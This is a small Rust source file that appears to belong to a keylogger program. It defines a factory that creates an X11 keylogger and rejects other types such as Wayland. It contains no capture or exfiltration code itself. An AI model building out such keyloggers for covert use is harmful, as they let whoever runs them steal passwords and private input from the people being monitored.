use super::X_keylogger::XKeylogger;
use super::keylogger::Keylogger;

pub enum KeyloggerTypes {
    X, 
    Wayland,
}

pub trait KeyloggerFact {
    fn create_keylogger(&self, ktype: KeyloggerTypes) -> Result<Box<dyn Keylogger>, &'static str>;
}


pub struct KeyloggerFactory;

impl KeyloggerFact for KeyloggerFactory {
    fn create_keylogger(&self, ktype: KeyloggerTypes) -> Result<Box<dyn Keylogger>, &'static str>{
        match ktype {
            KeyloggerTypes::X {} => {
                let xkeylogger = match XKeylogger::new() {
                    Ok(keylogger) => keylogger,
                    Err(_) => {
                        return Err("Failed to initialize X keylogger");
                    }
                };

                return Ok(Box::new(xkeylogger));
            }
            _ => Err("unsporrted keylogger type")
        }
    }
}
